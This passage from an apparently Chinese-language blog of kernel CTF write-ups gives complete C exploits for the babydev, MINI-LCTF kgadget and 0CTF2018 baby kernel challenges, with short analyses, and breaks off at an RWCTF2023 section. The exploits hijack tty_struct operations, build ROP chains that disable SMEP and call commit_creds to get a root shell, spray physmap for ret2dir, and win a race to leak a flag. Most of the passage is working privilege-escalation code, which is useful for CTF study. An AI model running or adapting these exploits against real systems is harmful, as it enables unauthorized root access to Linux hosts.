class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_dec_ebx_ret = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq_ret = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff813659b6</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="type">size_t</span> PTY_UNIX98_OPS = <span class="number">0xffffffff81a74e60</span>;</span><br><span class="line"><span class="type">size_t</span> PTM_UNIX98_OPS = <span class="number">0xffffffff81a74f80</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);  <span class="comment">// 读取tty_struct的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tty_ops = *(<span class="type">size_t</span>*)(fake_tty + <span class="number">3</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = ((tty_ops &amp; <span class="number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred += kernel_offset;</span><br><span class="line">    commit_creds  += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = pop_rdi_ret + kernel_offset;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = mov_cr4_rdi_pop_rbp_ret + kernel_offset;  <span class="comment">// bypass smep</span></span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRoot;</span><br><span class="line">    rop[p++] = swapgs_pop_rbp_ret + kernel_offset;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = iretq_ret + kernel_offset;</span><br><span class="line">    rop[p++] = getShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = mov_rsp_rax_dec_ebx_ret + kernel_offset;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = pop_rax_ret + kernel_offset;  <span class="comment">//令rax指向我们的rop</span></span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_op[<span class="number">7</span>] = mov_rsp_rax_dec_ebx_ret + kernel_offset;  <span class="comment">// 原为write函数指针</span></span><br><span class="line"></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;  <span class="comment">// hijack *ops</span></span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x8</span>];</span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);  <span class="comment">// tty_operation -&gt; write</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MINI-LCTF-kgadget"><a href="#MINI-LCTF-kgadget" class="headerlink" title="MINI-LCTF kgadget"></a>MINI-LCTF kgadget</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到当<code>ioctl</code>的第二个参数为<code>114514</code>时，内核会对<code>rdx</code>进行解引用然后执行<br>由于内核开启了<code>samp</code>和<code>semp</code>保护，导致我们无法直接的使用<code>kernel rop</code>，所以我们可以使用<code>ret2dir + mmap spary</code><br>这里需要注意的是，解引用的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [rsp], rbx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>我们可以看到其并没有令<code>rsp</code>寄存器指向我们的恶意代码的区域，所以我们可以利用<code>pt_regs</code>来进行栈迁移</p><h4 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这个结构体存放了一系列的寄存器，这是因为在进行系统调用时，会完成从用户态到内核态的切换，因此需要保存用户态时的上下文寄存器，而这些寄存器的值都需要保存在<code>pt_regs</code>中。<br>而我们发现题目的作者限制了我们只能够控制<code>r8</code>和<code>r9</code>存储器。我们可以计算发现栈顶距离<code>r9</code>寄存器的距离为<code>0xc0</code>，于是我们可以使用下面两句汇编来进行栈迁移</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret; </span><br><span class="line">pop rsp; ret;</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff8108c6f0</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>; <span class="comment">// swapgs ; nop ; nop ; nop ; ret</span></span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> xor_esi_ret = <span class="number">0xffffffff81224afc</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> target;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span>* rop;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">15000</span>; i++)&#123;</span><br><span class="line">        rop = mmap(<span class="literal">NULL</span>, <span class="number">4096</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2048</span>/<span class="number">8</span>; j++) rop[j] = add_rsp_0xc0;</span><br><span class="line">        <span class="keyword">for</span> (;j &lt; <span class="number">4096</span>/<span class="number">8</span>; j++) rop[j] = xor_esi_ret;</span><br><span class="line">        rop[--j] = user_ss;</span><br><span class="line">        rop[--j] = user_sp;</span><br><span class="line">        rop[--j] = user_rflags;</span><br><span class="line">        rop[--j] = user_cs;</span><br><span class="line">        rop[--j] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">        rop[--j] = <span class="number">0</span>;</span><br><span class="line">        rop[--j] = <span class="number">0</span>;</span><br><span class="line">        rop[--j] = swapgs_restore_regs_and_return_to_usermode+<span class="number">27</span>;</span><br><span class="line">        rop[--j] = commit_creds;</span><br><span class="line">        rop[--j] = init_cred;</span><br><span class="line">        rop[--j] = pop_rdi;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m[+]physamp spary successfully\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();   </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    spary();</span><br><span class="line">    </span><br><span class="line">    target =  <span class="number">0xffff888000000000</span> + <span class="number">0x6000000</span>;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  target;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span> <span class="comment">// ioctl的系统调用号</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, target;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1BF52;&quot;</span>  <span class="comment">// 控制ioctl的第二个参数</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0CTF2018-Final-baby-kernel"><a href="#0CTF2018-Final-baby-kernel" class="headerlink" title="[0CTF2018 Final] baby kernel"></a>[0CTF2018 Final] baby kernel</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>该题主要是让我们输入传进一个结构体，只要满足条件即可<code>printk</code>出<code>flag</code>，<code>printk</code>的结果可以通过<code>dmesg</code>来获得<br>没什么好说的，考点为条件竞争，从<code>start.sh</code>中我们也可以看到他是双核。利用条件竞争使其同时满足两个<code>if</code>的判断</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr;</span><br><span class="line"><span class="type">int</span> finish =<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[LEN+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程函数，不断修改flag指向的地址为内核中flag地址</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_attr_value</span><span class="params">(<span class="type">void</span> *s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> * <span class="title">s1</span> =</span> s; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)&#123;</span><br><span class="line">        s1-&gt;flag = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> addr_fd;</span><br><span class="line">    <span class="type">char</span> *idx;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> ret = ioctl(fd,<span class="number">0x6666</span>);    </span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取内核硬编码的flag地址</span></span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addr_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,-LEN,SEEK_END);</span><br><span class="line">    read(addr_fd,buf,LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        idx+=<span class="number">16</span>;</span><br><span class="line">        addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造attr数据结构</span></span><br><span class="line">    t.len = <span class="number">33</span>;</span><br><span class="line">    t.flag = buf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建恶意线程</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change_attr_value,&amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ret = ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">        t.flag = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_cancel(t1);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RWCTF2023体验赛-Digging-into-kernel-3"><a href="#RWCTF2023体验赛-Digging-into-kernel-3" class="headerlink" title="[RWCTF2023体验赛] Digging into kernel 3"></a>[RWCTF2023体验赛] Digging into kernel 3</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 